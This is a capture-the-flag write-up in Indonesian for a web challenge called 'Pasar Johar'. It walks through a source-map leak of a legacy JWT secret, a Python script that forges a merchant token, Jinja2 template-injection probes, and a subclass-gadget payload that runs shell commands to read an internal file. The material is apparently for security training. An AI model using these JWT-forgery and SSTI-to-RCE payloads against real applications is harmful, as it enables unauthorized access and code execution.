# Writeup — Pasar Johar

- **Kategori:** Web
- **Poin:** 500
- **Target:** http://103.196.155.224:8103
- **Flag:** `CF2{web_pasar_johar_4013c0f749b871c9635a}`

**Deskripsi:** Sebuah akun pembeli mampu membuka fungsi pedagang dan mengekspor laporan internal. Temukan rangkaian kelemahan yang memungkinkan kejadian itu.

---

## Ringkasan rantai

`Source map leak` → kunci JWT legacy → `JWT forgery (legacy key masih dipercaya)` → `role escalation buyer→merchant` → `SSTI (Jinja2)` → `RCE` → baca laporan internal.

---

## Langkah

### 1. Information disclosure via source map
`/static/app.js` menunjuk `app.js.map`. File `/static/app.js.map` membocorkan `config/legacy.js`:

```
// config/legacy.js -- KONFIGURASI LAMA, tidak lagi dipakai frontend.
// Catatan: token lama masih diterima verifikator.
//   kid: johar-legacy-01
//   secret: b7fb9c7257c3940afd60a8e28eaa9f2906a357571571443803977257b7acb2dd
```

### 2. Analisis JWT
Login demo (`pembeli01 : johar-demo`) memberi token:

```
header : {"alg":"HS256","kid":"johar-current-01","typ":"JWT"}
payload: {"sub":"pembeli01","role":"buyer"}
```

`/merchant` → `403 Akses merchant ditolak`. Secret `johar-current-01` tak diketahui, **tapi verifikator masih menerima `kid: johar-legacy-01`** yang secret-nya bocor.

### 3. JWT forgery + role escalation
Tempa token dengan kid legacy dan `role: merchant`, tanda tangan HS256 memakai secret legacy sebagai **string key**:

```python
import base64, hmac, hashlib, json
secret = b"b7fb9c7257c3940afd60a8e28eaa9f2906a357571571443803977257b7acb2dd"
b64u = lambda b: base64.urlsafe_b64encode(b).decode().rstrip("=")
h = b64u(json.dumps({"alg":"HS256","kid":"johar-legacy-01","typ":"JWT"},separators=(',',':')).encode())
p = b64u(json.dumps({"sub":"pembeli01","role":"merchant"},separators=(',',':')).encode())
sig = b64u(hmac.new(secret, f"{h}.{p}".encode(), hashlib.sha256).digest())
token = f"{h}.{p}.{sig}"
```

`GET /merchant` dengan token ini → `200`, dashboard merchant terbuka. Isinya menunjuk laporan di `/srv/johar/internal/laporan-final.txt` dan tautan pratinjau template `/merchant/preview?template=...`.

### 4. SSTI (Jinja2) di `/merchant/preview`
`template={{7*7}}` → `49`.

Globals Jinja di-strip (`range`, `dict`, `cycler`, `lipsum` → error) sehingga terlihat seperti sandbox, **tetapi akses atribut dunder langsung tetap jalan**:

```
{{ "".__class__.__mro__ }}  →  (<class 'str'>, <class 'object'>)
```

Pivot lewat subclasses `object` untuk mencari gadget:

```
{{ ().__class__.__bases__[0].__subclasses__() }}
```

Index gadget (stabil dalam proses): `os._wrap_close` [156], `warnings.catch_warnings` [222], `subprocess.Popen` [304].

### 5. RCE
Lewat `os._wrap_close.__init__.__globals__['popen']`:

```jinja
{{ ().__class__.__bases__[0].__subclasses__()[156].__init__.__globals__['popen']('cat /srv/johar/internal/laporan-final.txt').read() }}
```

Hasil (`id` → `uid=10001(appuser)`):

```
CF2{web_pasar_johar_4013c0f749b871c9635a}
```

Catatan: `/srv/johar/secrets.json` ada tetapi mode `-r--------` (tak terbaca oleh `appuser`); tidak diperlukan untuk flag ini.
